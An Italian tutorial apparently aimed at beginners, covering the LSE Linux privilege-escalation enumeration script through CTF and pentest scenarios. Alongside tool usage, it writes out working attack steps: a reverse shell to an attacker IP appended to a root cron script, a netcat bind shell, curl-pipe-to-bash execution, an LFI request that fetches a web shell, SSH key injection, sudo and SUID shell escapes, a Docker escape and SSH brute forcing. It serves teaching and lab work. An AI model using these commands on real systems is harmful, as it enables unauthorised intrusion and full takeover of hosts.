---
title: 'LSE (Linux Smart Enumeration): Automated Linux Privilege Escalation Checklist'
slug: lse
description: 'LSE (Linux Smart Enumeration): Automated Linux Privilege Escalation Checklist'
image: /Gemini_Generated_Image_45b6l045b6l045b6.webp
draft: false
date: 2026-02-17T00:00:00.000Z
categories:
  - tools
subcategories:
  - privilege-escalation
tags:
  - linux-enumeration
---

LSE (Linux Smart Enumeration) è uno script bash che ti guida nella ricerca di vulnerabilità per privilege escalation su sistemi Linux. La sua caratteristica distintiva è il **sistema a livelli**: puoi partire da check basilari (level 0) e aumentare progressivamente la profondità fino a scansioni forensi (level 2).

Se è la prima volta che ti avvicini alla privilege escalation su Linux, LSE è il punto di partenza ideale. A differenza di LinPEAS che ti sommerge di informazioni colorate, o LinEnum che ti dà dati grezzi, LSE **organizza i risultati per severità** e ti mostra solo ciò che è rilevante al livello che hai scelto. È come avere un tutor che ti dice "guarda prima qui, poi qui, e infine qui".

In questo articolo scoprirai come usare LSE dal tuo primo tentativo fino a tecniche avanzate. Spiegheremo ogni output, cosa significa realmente, e come trasformare un finding in una shell root. Non serve esperienza pregressa: se hai una shell Linux e vuoi capire come scalare privilegi, sei nel posto giusto.

LSE si posiziona nella kill chain nella fase **Post-Exploitation Enumeration**, subito dopo aver ottenuto accesso iniziale al sistema. È il tuo primo strumento per capire "ok, ho una shell, e adesso?"

***

## 1️⃣ Setup e Installazione

### Prima di iniziare: cosa ti serve

Per usare LSE hai bisogno di:

* Una shell su un sistema Linux (può essere una macchina CTF, una VM di test, o un lab personale)
* Accesso a `/tmp` o `/dev/shm` per salvare lo script
* Bash versione 3.0+ (presente su 99% dei sistemi Linux moderni)

**Non ti servono:**

* Permessi di root (LSE funziona anche come utente normale)
* Connessione internet sul target (solo per scaricare lo script)
* Conoscenze avanzate di Linux (LSE ti guida step-by-step)

### Download da GitHub

```bash
# Metodo 1: Clone repository completo
git clone https://github.com/diego-treitos/linux-smart-enumeration.git
cd linux-smart-enumeration

# Verifica contenuto
ls -la
# lse.sh  README.md  tests/

# Rendi eseguibile
chmod +x lse.sh
```

**Versione attuale:** LSE mantiene versioning sul repository diego-treitos/linux-smart-enumeration. Controlla sempre per ultimi update.

**File size:** \~50KB (script bash puro, no dipendenze)

### Download rapido (metodo consigliato)

```bash
# Download singolo file
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh

# Oppure con curl
curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh -o lse.sh

# Permessi esecuzione
chmod +x lse.sh
```

### Trasferimento su sistema target

**Scenario tipico:** Hai una shell su una macchina compromessa e vuoi eseguire LSE.

**Metodo 1: HTTP server (il più semplice)**

```bash
# Sul tuo computer (attacker machine)
python3 -m http.server 8000
# Serving HTTP on 0.0.0.0 port 8000

# Sul target (nella shell compromessa)
cd /tmp
wget http://10.10.14.5:8000/lse.sh
chmod +x lse.sh
```

🎓 **Spiegazione per principianti:** `wget` scarica un file da un URL. `chmod +x` rende il file eseguibile (così puoi lanciarlo come `./lse.sh`). `/tmp` è una directory temporanea dove ogni utente può scrivere.

**Metodo 2: Execution diretta in-memory**

```bash
# Sul target
curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh | bash
```

🎓 **Cosa fa questo comando:** Scarica lo script e lo esegue direttamente senza salvarlo su disco. Utile quando `/tmp` è montato con `noexec` (blocco esecuzione) o vuoi essere più stealth.

**Metodo 3: Base64 encoding (nessun network tool sul target)**

```bash
# Sul tuo computer
base64 lse.sh > lse.b64

# Sul target, paste il contenuto
cat << 'EOF' | base64 -d > lse.sh
[incolla qui il contenuto di lse.b64]
EOF
chmod +x lse.sh
```

### Verifica che funzioni

```bash
./lse.sh --help
```

**Output che dovresti vedere:**

```
LSE Version 4.12

Usage: lse.sh [options]

OPTIONS
  -c           Force color output
  -i           Non interactive mode
  -l LEVEL     Verbosity level (0-2, default: 0)
  -s SELECTION Select tests (comma separated)
  -h           This help
```

Se vedi questo menu, LSE è pronto all'uso! 🎉

***

## 2️⃣ Uso Base: I Livelli di LSE

### Capire il sistema a livelli

LSE usa **3 livelli di profondità** (0, 1, 2). Pensa a questi livelli come a una progressione di apprendimento:

| **Level** | **Cosa mostra**                | **Quando usarlo**                      | **Tempo esecuzione** |
| --------- | ------------------------------ | -------------------------------------- | -------------------- |
| **0**     | Solo vulnerabilità quasi certe | Primo approccio, CTF rapidi            | \~20 secondi         |
| **1**     | Aggiungi possibili vettori     | Pentest standard, quando hai più tempo | \~40 secondi         |
| **2**     | Tutto (inclusi info gathering) | Audit completo, forensic analysis      | \~90 secondi         |

🎓 **Per chi inizia:** Parti sempre da level 0. Ti mostra solo le cose davvero importanti. Se non trovi nulla, passa a level 1. Level 2 usalo solo quando vuoi vedere TUTTO il sistema.

### Primo comando: level 0 (default)

```bash
./lse.sh
```

**Output esempio (sistema vulnerabile):**

```
---
LSE Version 4.12 - https://github.com/diego-treitos/linux-smart-enumeration
---

[!] fst000 Writable files outside user's home........................... yes!
---
/etc/passwd is writable
/opt/scripts/backup.sh is writable
---

[!] sud000 Sudo - No password required................................... yes!
---
User john may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/systemctl restart webapp
---

[!] ctn010 Container breakout via socket mount.......................... yes!
---
/var/run/docker.sock found and accessible
---
```

**Cosa significano questi simboli:**

* `[!]` = **Vulnerabilità trovata!** (il colore sarebbe rosso su terminal con colori)
* `[*]` = Informazione potenzialmente utile
* `[-]` = Check eseguito, nessun finding

**Codici test:** Ogni riga ha un codice tipo `fst000`, `sud000`. Questi identificano il tipo di test:

* `fst` = File System Tests
* `sud` = Sudo Tests
* `ctn` = Container Tests
* `sof` = Software Tests
* E così via...

🎓 **Come leggo questo output?** Le righe con `[!]` sono le tue opportunità di privilege escalation. In questo esempio:

1. `/etc/passwd` è writable = puoi modificare utenti/password
2. Puoi fare `sudo systemctl` senza password = possibile abuse
3. Docker socket esposto = puoi escapare dal container

### Level 1: più dettagli

```bash
./lse.sh -l 1
```

**Output aggiuntivo rispetto a level 0:**

```
[*] sud010 Sudo - Command execution with root privileges................ yes!
---
User john can run some commands with sudo:
    (root) /usr/bin/vim

[*] fst020 Uncommon setuid binaries...................................... yes!
---
-rwsr-xr-x 1 root root /usr/local/bin/backup
-rwsr-xr-x 1 root root /opt/tools/sysinfo
```

Level 1 aggiunge finding "meno sicuri" ma comunque sfruttabili. Vim con sudo? Possibile shell escape. SUID binary custom? Da investigare.

### Level 2: modalità forensic

```bash
./lse.sh -l 2
```

Level 2 mostra **tutto**: processi running, configurazioni di rete dettagliate, software installato, file modificati di recente, cronologia comandi, ecc. Utile per capire a fondo il sistema, ma può essere overwhelming per principianti.

**Consiglio pratico:** Se è la tua prima volta, esegui solo level 0. Quando capisci cosa cercare, passa a level 1. Level 2 è per quando hai tempo e vuoi mappare tutto il sistema.

***

## 3️⃣ Tecniche Operative (CORE)

### Scenario 1: CTF beginner - Da shell web a user

**Contesto:** Hai sfruttato una vulnerabilità web (tipo SQL injection) e hai ottenuto una shell come `www-data`. Non sai cosa fare.

**Step 1: Stabilizza la shell**

```bash
# Se hai una shell basic, upgradale a interattiva
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# Verifica chi sei
whoami
# www-data

# Verifica dove sei
pwd
# /var/www/html
```

🎓 **Perché stabilizzare la shell?** Una shell non interattiva non può eseguire comandi come `su` o usare editor. La shell "pty" (pseudo-terminal) ti dà un'esperienza simile a SSH.

**Step 2: Download ed esecuzione LSE**

```bash
cd /tmp
wget http://10.10.14.5:8000/lse.sh
chmod +x lse.sh
./lse.sh
```

**Output critico trovato:**

```
[!] fst000 Writable files outside user's home........................... yes!
---
/home/john/.ssh/authorized_keys is writable by www-data
---
```

**Step 3: Exploitation**

```bash
# LSE ha trovato che puoi scrivere le chiavi SSH di john!

# Sul tuo computer, genera chiave SSH
ssh-keygen -t rsa -f john_key
# Genera: john_key (privata) e john_key.pub (pubblica)

# Sul target, aggiungi tua chiave pubblica
cat << 'EOF' >> /home/john/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... [la tua public key]
EOF

# Sul tuo computer, connettiti come john
ssh -i john_key john@target.htb
# john@target:~$ ← SEI DENTRO!

# Prendi la flag
cat /home/john/user.txt
```

**Timeline:**

* Stabilizzazione shell: 30s
* Download LSE: 5s
* Esecuzione LSE: 20s
* Analysis: 1min
* Exploitation: 2min
* **Totale: \~4 minuti**

🎓 **Cosa è successo?** LSE ha trovato che `www-data` (tu) può scrivere nel file `authorized_keys` di john. Quel file contiene le chiavi SSH autorizzate ad accedere come john. Aggiungendo la tua chiave, hai ottenuto accesso SSH come john senza password.

**Cosa fare se fallisce:**

1. **authorized\_keys non è writable:** LSE potrebbe aver trovato altro, come cron job writable o sudo misconfiguration. Leggi tutti i `[!]` nell'output.
2. **SSH connection refused:** Il servizio SSH potrebbe non essere in ascolto. Verifica con `netstat -tuln | grep 22`. Se SSH è giù, cerca altri vettori come cron jobs.
3. **Permission denied adding key:** La directory `.ssh` ha permessi particolari. Prova a ricrearla: `rm -rf /home/john/.ssh && mkdir /home/john/.ssh && echo 'tua_key' > /home/john/.ssh/authorized_keys`

***

### Scenario 2: Sudo abuse con NOPASSWD

**Contesto:** Hai shell come utente `developer` su server di sviluppo. LSE trova sudo misconfiguration.

```bash
./lse.sh
```

**Output:**

```
[!] sud000 Sudo - No password required................................... yes!
---
User developer may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/git
---
```

**Analysis:**

🎓 **Cosa significa NOPASSWD?** Normalmente quando fai `sudo comando`, il sistema chiede la password. NOPASSWD significa "puoi usare sudo su questo comando senza password". Git con sudo? Pericoloso!

**Exploitation con GTFOBins:**

```bash
# GTFOBins è un database di binary Unix che possono essere abusati

# Per git + sudo, vai su https://gtfobins.github.io/gtfobins/git/

# Exploitation:
sudo git -p help
# Si apre un pager (programma per visualizzare testo lungo)

# Nel pager, digita:
!/bin/bash
# Ottieni root shell!

# Verifica
whoami
# root
```

🎓 **Perché funziona?** Git usa un "pager" (tipo `less`) per mostrare help lunghi. Il pager ha una funzionalità "!" che esegue comandi shell. Siccome git parte con sudo, il comando eseguito è root!

**Metodo alternativo (più diretto):**

```bash
sudo git --exec=/bin/bash help
# bash-5.0# (root shell immediata)
```

**Timeline:** 30 secondi dall'output LSE alla root shell.

***

### Scenario 3: SUID binary custom

**Contesto:** Sistema enterprise con applicazioni custom. LSE trova binary SUID sospetto.

```bash
./lse.sh -l 1
```

**Output:**

```
[*] fst020 Uncommon setuid binaries...................................... yes!
---
-rwsr-xr-x 1 root root 16384 Jan 15 2024 /usr/local/bin/monitor
---
```

🎓 **Cos'è un SUID binary?** Un file con il bit SUID (`s` invece di `x` nei permessi) viene eseguito con i privilegi del proprietario (in questo caso `root`), non dell'utente che lo lancia. Se trovi vulnerabilità in un SUID binary di root, ottieni root!

**Analysis del binary:**

```bash
# Step 1: Cosa fa?
/usr/local/bin/monitor
# Output: System Monitor v1.0
# CPU Usage: 15%
# Memory: 2GB/4GB
# [...]

# Step 2: Come lo fa?
strings /usr/local/bin/monitor | less
# Cerca comandi eseguiti internamente

# Output trovato:
# system("ps aux")
# system("free -h")  
# system("df -h")

# ⚠️ Nota: "ps", non "/bin/ps" → Path hijacking vulnerability!
```

🎓 **Cos'è il path hijacking?** Il programma chiama `ps` senza specificare il path completo (`/bin/ps`). Linux cerca `ps` nelle directory elencate in `$PATH`. Se mettiamo un nostro fake `ps` in una directory prima di `/bin` nel PATH, il sistema esegue il nostro!

**Exploitation:**

```bash
# Step 1: Crea fake ps che spawna shell
cd /tmp
echo '/bin/bash -p' > ps
chmod +x ps

# Step 2: Modifica PATH
export PATH=/tmp:$PATH

# Step 3: Esegui SUID binary
/usr/local/bin/monitor
# bash-5.0# ← Root shell!
```

🎓 **Perché `-p` in bash?** L'opzione `-p` in bash mantiene i privilegi effettivi. Senza `-p`, bash potrebbe droppare i privilegi SUID per sicurezza.

**Timeline:** 3-4 minuti (1min analysis, 1min exploitation, 2min troubleshooting se serve)

***

## 4️⃣ Tecniche Avanzate

### Selection mode: focus su aree specifiche

LSE può testare solo categorie specifiche invece di tutto. Utile quando sai cosa cercare.

**Categorie disponibili:**

```bash
./lse.sh -s
```

Output mostra tutte le categorie:

* `fst` - File System Tests
* `sud` - Sudo Configuration
* `sof` - Installed Software
* `pro` - Processes
* `net` - Network Configuration
* `ctn` - Containers
* E altre...

**Esempio: Solo sudo enumeration**

```bash
./lse.sh -s sud -l 1
```

Output mostra **solo** test relativi a sudo. Risparmia tempo se sai che altri vettori non sono interessanti.

**Esempio: Multi-selection**

```bash
./lse.sh -s fst,sud,ctn -l 2
```

Testa filesystem, sudo, e container in profondità. Combina più categorie separate da virgola.

**Use case pratico:** Sei in un pentest con time limit di 2 ore per host. Vuoi focus su vettori più comuni:

```bash
./lse.sh -s sud,fst,sof -l 1 | tee lse_quick.txt
```

Questo salta network enumeration (lenta) e container checks (non applicabile se non sei in container).

***

### Differential enumeration per tracking changes

In engagement lunghi, esegui LSE periodicamente per vedere cosa cambia.

```bash
# Baseline dopo initial access
./lse.sh -l 1 > lse_day1.txt

# Dopo aver ottenuto sudo parziale (giorno 2)
./lse.sh -l 1 > lse_day2.txt

# Diff analysis
diff lse_day1.txt lse_day2.txt | grep "^>" | head -20
```

**Cosa cerchi nel diff:**

```
> [!] sud000 Sudo - No password required................................... yes!
> [*] fst030 Writable /etc/systemd directory............................... yes!
```

Questo mostra **nuovi vettori** che sono apparsi. Magari l'admin ha aggiunto un sudo NOPASSWD temporaneo, o hai ottenuto membership a un gruppo che dà accesso a file critici.

***

### Colored output redirection

LSE usa colori ANSI. Se redireziona output a file, i colori diventano codici strani.

**Problema:**

```bash
./lse.sh > output.txt
# Il file contiene: ^[[91m[!]^[[0m invece di colori
```

**Soluzione 1: Force colors**

```bash
./lse.sh -c > output.txt
# -c forza colori anche su non-terminal
```

**Soluzione 2: Strip colors**

```bash
./lse.sh | sed 's/\x1b\[[0-9;]*m//g' > clean_output.txt
```

**Soluzione 3: Usa tee (consigliato)**

```bash
./lse.sh | tee output.txt
```

Tee mostra output colorato a schermo E salva in file contemporaneamente.

***

### Non-interactive mode per automation

Flag `-i` disabilita prompt interattivi. Utile per script automatici.

```bash
./lse.sh -i -l 1 > lse_output.txt
```

Senza `-i`, LSE potrebbe chiedere conferme tipo "Continue with slow test? \[y/N]". Con `-i`, assume sempre "yes" e procede automaticamente.

**Use case: Batch scanning**

```bash
# Script per scannerare 50 host
for host in $(cat targets.txt); do
  ssh user@$host 'curl -s http://repo/lse.sh | bash -s -- -i -l 1' > "lse_$host.txt" &
done
wait
```

***

### Parsing output per automated triage

LSE output è structured, puoi parsarlo programmaticamente.

**Estrai solo vulnerabilità critiche:**

```bash
./lse.sh -l 1 | grep "^\[!\]"
```

**Estrai codici test vulnerabili:**

```bash
./lse.sh -l 1 | grep "^\[!\]" | awk '{print $2}' | sort -u
# Output:
# ctn010
# fst000
# sud000
```

**Python parser per report automatico:**

```python
import re
import subprocess

# Run LSE
result = subprocess.run(['./lse.sh', '-l', '1'], capture_output=True, text=True)
output = result.stdout

# Extract vulnerabilities
vulns = re.findall(r'\[!\] (\w+) (.+?)\.+ (yes!)', output)

print("=== LSE Vulnerability Summary ===")
for code, description, _ in vulns:
    print(f"[{code}] {description.strip()}")
```

Questo genera un report sintetico da integrare in tool di pentest automation.

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: Docker container enumeration and escape

**Contesto:** Hai compromesso un'applicazione in container Docker. Vuoi capire se puoi escapare verso l'host.

```bash
# COMANDO - LSE con focus su container
./lse.sh -s ctn -l 2
```

**OUTPUT ATTESO:**

```
[!] ctn010 Container breakout via socket mount.......................... yes!
---
/var/run/docker.sock found at:
srw-rw---- 1 root docker /var/run/docker.sock
Current user is member of 'docker' group
---

[*] ctn020 Container mounted filesystems................................ yes!
---
/host-root mounted on / at /host
---

[!] ctn030 Privileged container......................................... yes!
---
Container capabilities include: SYS_ADMIN, SYS_PTRACE
---
```

🎓 **Cosa significano questi finding?**

1. **Docker socket esposto:** Il file `/var/run/docker.sock` è l'API di Docker. Se accessibile, puoi controllare Docker dall'interno del container.
2. **Filesystem host montato:** La directory `/host` è il filesystem dell'host vero montato nel container.
3. **Privileged container:** Il container ha capabilities speciali che permettono azioni di basso livello.

**EXPLOITATION CHAIN:**

**Metodo 1: Docker socket abuse**

```bash
# Verifica accesso a docker socket
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker /var/run/docker.sock

# Usa Docker API per creare container privilegiato
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/hostfs"],"Privileged":true}' \
  http://localhost/containers/create

# Output: {"Id":"abc123..."}

# Start container
curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/abc123.../start

# Exec into new container
docker exec -it abc123 chroot /hostfs /bin/bash
# root@host:/#  ← Escaped to host as root!
```

**Metodo 2: Mounted filesystem escape (più semplice)**

```bash
# Se /host è montato
ls -la /host
# drwxr-xr-x 23 root root 4096 /

# Diretto chroot
chroot /host /bin/bash
# root@host:/# ← Immediato accesso a host

# Verifica
cat /etc/hostname
# Se hostname diverso dal container = sei sull'host!
```

**COSA FARE SE FALLISCE:**

1. **Permission denied su docker.sock:** Verifica group membership con `id`. Se non sei nel group `docker`, questo metodo non funziona. Prova altri vettori trovati da LSE.
2. **chroot permission denied:** Serve `CAP_SYS_ADMIN` capability. Verifica con `capsh --print`. Se non ce l'hai, usa il metodo docker API.
3. **No /host mount:** Cerca altri mount con `mount | grep -v "proc\|sys"`. Potrebbero esserci path diversi come `/hostfs` o `/mnt/host`.

**Timeline:** 2-3 minuti (30s LSE + 2min exploitation)

***

### Scenario B: Enterprise audit - Kernel exploit identification

**Contesto:** Security audit su 100+ server Linux. Devi identificare quali sono vulnerabili a kernel exploit noti.

```bash
# COMANDO - Batch execution con output structured per parsing
for server in $(cat servers.txt); do
  echo "[*] Scanning $server"
  ssh admin@$server 'curl -s http://internal-tools/lse.sh | bash -s -- -i -l 0 -s sof' | grep -E "^\[!\]|Kernel" > "audit_$server.txt" &
  
  # Limit concurrent
  if (( $(jobs -r | wc -l) >= 20 )); then
    wait -n
  fi
done
wait

echo "[*] All scans completed. Analyzing results..."
```

**OUTPUT ANALYSIS:**

```bash
# Aggrega risultati kernel
grep -h "Linux version" audit_*.txt | sort -u

# Identifica server con kernel vulnerabili
for file in audit_*.txt; do
  if grep -q "\[!\]" "$file"; then
    echo "$file has vulnerabilities"
    grep "\[!\]" "$file"
  fi
done
```

**Output esempio:**

```
audit_web01.txt has vulnerabilities
[!] sof010 Vulnerable kernel version...................................... yes!

audit_web05.txt has vulnerabilities
[!] sof010 Vulnerable kernel version...................................... yes!

audit_db02.txt has vulnerabilities
[!] sof010 Vulnerable kernel version...................................... yes!
```

**EXPLOITATION PLANNING:**

```bash
# Per ogni server vulnerabile, identifica kernel version
grep "Linux version" audit_web01.txt
# Linux version 4.15.0-142-generic

# Searchsploit per CVE noti
searchsploit kernel 4.15.0 ubuntu privilege | grep -i local
# Ubuntu Kernel 4.15.0 < 4.15.0-147 - Local Privilege Escalation (CVE-2021-3493)

# Pianifica patching prioritario
echo "web01, web05, db02: CVE-2021-3493 (High)" >> patching_priority.txt
```

🎓 **Perché usare LSE invece di manual check?** LSE automatizza il controllo e **identifica se il kernel è vulnerabile**, non solo la versione. Molti server hanno kernel old ma con backport patches. LSE verifica entrambi.

**COSA FARE SE FALLISCE:**

* **SSH batch fails:** Alcuni server potrebbero richiedere password invece di SSH key. Crea lista server "failed" e gestiscili manualmente.
* **Timeout su server lenti:** Aggiungi `timeout 120s` wrapper per evitare hang infinito.
* **LSE non trova vulnerabilità:** Non tutti i kernel vecchi sono vulnerabili (backport patches). Cross-check con `uname -r` e database CVE manualmente.

**Timeline:** 10-15 minuti per 100 server in parallelo

***

### Scenario C: Privilege escalation via cronjob writable script

**Contesto:** Hai shell come utente `backup` su application server. Tempo limitato: 10 minuti.

```bash
# COMANDO - Quick scan level 0
./lse.sh
```

**OUTPUT ATTESO:**

```
[!] fst000 Writable files outside user's home........................... yes!
---
/opt/scripts/db_backup.sh is writable by backup group
---

[*] pro020 Cron jobs...................................................... yes!
---
*/5 * * * * root /opt/scripts/db_backup.sh
---
```

🎓 **Cosa significa?** Il file `db_backup.sh` è eseguito da root ogni 5 minuti tramite cron, MA tu (user backup) puoi modificarlo!

**EXPLOITATION:**

```bash
# Verifica permessi
ls -la /opt/scripts/db_backup.sh
# -rwxrwxr-x 1 root backup 1234 Jan 15 2024 /opt/scripts/db_backup.sh
#            ^^^^ ^^^^^^
#            owner group ← Tu sei nel group backup!

# Controlla contenuto attuale (non sovrascrivere, aggiungi!)
cat /opt/scripts/db_backup.sh
# #!/bin/bash
# mysqldump -u backup -p'password' database > /backups/db.sql

# Aggiungi reverse shell alla fine
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/scripts/db_backup.sh

# Sul tuo computer, listener
nc -lvnp 4444

# Attendi max 5 minuti (cron ogni 5 min)
# ...
# Connection from target:45678
# root@target:/# ← Root shell!
```

**COSA FARE SE FALLISCE:**

1. **Script non viene eseguito dopo 5min:** Verifica che cron service sia running: `systemctl status cron` o `ps aux | grep cron`
2. **Connection timeout alla reverse shell:** Firewall outbound potrebbe bloccare. Prova con bind shell invece:

```bash
echo 'nc -lvnp 5555 -e /bin/bash' >> /opt/scripts/db_backup.sh
```

1. Poi dal tuo computer (dopo l’esecuzione del cron, es. 5 minuti):

```bash
nc target.htb 5555
```

1. **Permission denied editing script:** Forse i permessi sono cambiati. Re-run LSE per vedere se il file è ancora writable.

**Timeline:**

* LSE scan: 20s
* Analysis: 1min
* Exploitation setup: 30s
* Wait cron: 0-5min
* **Totale: 2-6 minuti**

***

## 6️⃣ Toolchain Integration

### Pre-LSE: Initial foothold

Prima di LSE, devi ottenere accesso al sistema. Sequence tipiche:

**Web exploitation → Shell → LSE**

```bash
# Esempio: LFI to RCE
curl "http://target.com/page.php?file=../../../../../../../var/log/apache2/access.log&cmd=wget%20http://10.10.14.5/shell.php"

# Accesso web shell
curl "http://target.com/uploads/shell.php?cmd=id"
# uid=33(www-data)

# Upgrade a interactive shell
curl "http://target.com/uploads/shell.php?cmd=python3%20-c%20%27import%20socket,subprocess;[...]%27"

# Ora hai shell interattiva
cd /tmp
wget http://10.10.14.5/lse.sh
chmod +x lse.sh
./lse.sh
```

**SSH bruteforce → Access → LSE**

```bash
# Hydra bruteforce
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.htb

# Found: admin:password123

# SSH login
ssh admin@target.htb

# Enumeration immediata
curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh | bash
```

***

### Post-LSE: Exploitation tools

LSE identifica vulnerabilità, poi usi tool specifici per sfruttarle.

**LSE → GTFOBins (sudo abuse)**

```bash
# LSE trova
[!] sud000 User can run sudo: /usr/bin/find

# Vai su GTFOBins
curl -s "https://gtfobins.github.io/gtfobins/find/" | grep -A5 "sudo"

# Exploitation
sudo find . -exec /bin/bash \; -quit
```

**LSE → Exploit-DB (kernel CVE)**

```bash
# LSE trova
[!] sof010 Vulnerable kernel version: 5.8.0-63-generic

# Searchsploit
searchsploit linux kernel 5.8.0
# Linux Kernel 5.8 < 5.11 - Local Privilege Escalation (CVE-2022-0847 DirtyPipe)

# Download exploit
wget https://www.exploit-db.com/download/50808 -O dirtypipe.c
gcc dirtypipe.c -o exploit
./exploit
```

**LSE → pspy (cron monitoring real-time)**

Se LSE trova cron jobs ma non sei sicuro dell'ordine di esecuzione:

```bash
# LSE mostra cron esistenti (static)
./lse.sh -s pro

# pspy monitora processi in real-time
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
# Vedi quando esattamente parte ogni cron
```

***

### LSE + LinEnum + LinPEAS: Triple approach

Per massima coverage, combina tutti e tre:

**Workflow consigliato:**

```bash
# Step 1: LSE per quick triage (20s)
./lse.sh | tee lse_quick.txt

# Step 2: Se LSE trova qualcosa, focus con LinEnum per details (30s)
./LinEnum.sh -k "keyword_from_lse" | tee linenum_details.txt

# Step 3: LinPEAS per automated CVE matching (60s)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash | tee linpeas_full.txt
```

**Quando usare quale:**

| **Tool**    | **Quando**        | **Perché**                          |
| ----------- | ----------------- | ----------------------------------- |
| **LSE**     | Always first      | Quick triage, severity sorting      |
| **LinEnum** | Need raw data     | Manual analysis, learning           |
| **LinPEAS** | Need completeness | CVE auto-detection, colorful output |

🎓 **Per principianti:** Usa solo LSE le prime volte. Quando capisci bene come funziona privilege escalation, aggiungi gli altri tool.

***

### Comparazione diretta: Quando usare LSE

| **Scenario**                        | **LSE**            | **LinPEAS**     | **LinEnum**   | **Manual**         |
| ----------------------------------- | ------------------ | --------------- | ------------- | ------------------ |
| **Prima volta su Linux privesc**    | ✅ Ideale           | ⚠️ Overwhelming | ⚠️ Too raw    | ❌ Troppo complesso |
| **CTF time-limited (\<10min)**      | ✅ Level 0 perfect  | ⚠️ Troppo lento | ✅ OK          | ❌ No time          |
| **Learning privilege escalation**   | ✅ Excellent        | 🟡 Good         | 🟡 Good       | ✅ Best             |
| **Enterprise pentest (1 ora/host)** | ✅ L1 comprehensive | ✅ Full scan     | 🟡 Supplement | ⚠️ Too slow        |
| **Red Team stealth**                | 🟡 Medium noise    | ❌ Too noisy     | 🟡 Medium     | ✅ Best             |
| **Low-resource target**             | ✅ Lightweight      | ⚠️ Heavy        | ✅ Lightweight | ✅ Minimal          |
| **Container environment**           | ✅ Has CTN tests    | ⚠️ Generic      | 🟡 Basic      | ⚠️ Need expertise  |

**Quando LSE è la scelta migliore:**
✅ Stai imparando privilege escalation
✅ Vuoi severity sorting invece di data dump
✅ Lavori in container Docker/LXC
✅ Hai tempo limitato e vuoi focus
✅ Target con risorse limitate

***

## 7️⃣ Attack Chain Completa

### From External to Root: LSE-Guided Privilege Escalation

**Scenario completo:** External pentest su web application fino a root compromise.

***

**FASE 1: Reconnaissance (Nmap)**

```bash
nmap -sC -sV -p- 10.10.11.125 -oN nmap.txt
```

**Output:**

```
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Apache httpd 2.4.41
```

**Timeline:** 5 minuti

***

**FASE 2: Web Enumeration (Gobuster)**

```bash
gobuster dir -u http://10.10.11.125 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

**Output:**

```
/admin.php (Status: 200)
/uploads/ (Status: 301)
/config.php.bak (Status: 200)  ← Backup file exposed!
```

**Timeline:** 10 minuti

***

**FASE 3: Initial Access (Credential leak + File upload)**

```bash
# Download config backup
curl http://10.10.11.125/config.php.bak

# Output:
# <?php
# $db_user = "webapp";
# $db_pass = "WebApp2024!";
# $upload_path = "/var/www/html/uploads/";
# ?>

# Try credentials su admin.php
# Login successful!

# Upload PHP web shell (upload form non valida extension)
curl -X POST -F "file=@shell.php" http://10.10.11.125/admin.php?page=upload

# Access shell
curl "http://10.10.11.125/uploads/shell.php?cmd=id"
# uid=33(www-data)
```

**Timeline:** 5 minuti

***

**FASE 4: Shell Upgrade + LSE Enumeration**

```bash
# Upgrade shell
curl "http://10.10.11.125/uploads/shell.php?cmd=python3%20-c%20%27import%20pty;pty.spawn%28%22/bin/bash%22%29%27"

# Download LSE
www-data@target:/tmp$ wget http://10.10.14.5:8000/lse.sh
www-data@target:/tmp$ chmod +x lse.sh
www-data@target:/tmp$ ./lse.sh
```

**Output critico:**

```
[!] fst000 Writable files outside user's home........................... yes!
---
/home/developer/.ssh directory is writable by www-data
---

[!] sud010 User passwords in files....................................... yes!
---
Found in /var/www/html/config.php.bak:
webapp:WebApp2024!
---

[*] sof020 MySQL running................................................ yes!
---
MySQL process found: mysqld
Configuration: /etc/mysql/my.cnf
---
```

**Timeline:** 2 minuti

***

**FASE 5: Lateral Movement (www-data → developer)**

```bash
# LSE ha trovato password MySQL. Testa su SSH users.
www-data@target:/tmp$ cat /etc/passwd | grep -v nologin | grep -v false
# root, developer, mysql

# Try password su developer
www-data@target:/tmp$ su developer
# Password: WebApp2024!
# su: Authentication failure

# Try password variation
www-data@target:/tmp$ su developer
# Password: Developer2024!
# developer@target:/tmp$ ← Success! (password simile)

# Alternative: SSH key injection (LSE trovato .ssh writable)
www-data@target:/tmp$ ssh-keygen -t rsa -f dev_key -N ''
www-data@target:/tmp$ cat dev_key.pub >> /home/developer/.ssh/authorized_keys

# Dalla tua macchina
$ ssh -i dev_key developer@10.10.11.125
developer@target:~$ cat user.txt
# [USER FLAG HERE]
```

**Timeline:** 3 minuti

***

**FASE 6: Privilege Escalation (developer → root)**

```bash
# Re-run LSE come developer
developer@target:~$ cd /tmp
developer@target:/tmp$ ./lse.sh
```

**Output:**

```
[!] sud000 Sudo - No password required................................... yes!
---
User developer may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/docker
---
```

**Exploitation:**

```bash
# Docker NOPASSWD = immediate root via container mount
developer@target:/tmp$ sudo docker run -v /:/hostfs -it ubuntu chroot /hostfs /bin/bash

# root@container:/# ← Root shell sull'host!

# Verifica
root@container:/# cat /root/root.txt
# [ROOT FLAG HERE]
```

**Timeline:** 1 minuto

***

**TOTALE END-TO-END:** \~25 minuti da external scan a root flag.

**Tools usati:**

1. Nmap (recon)
2. Gobuster (web enum)
3. cURL (manual exploitation)
4. **LSE** (privilege escalation discovery - KEY TOOL)
5. SSH (lateral movement)
6. Docker (final privilege escalation)

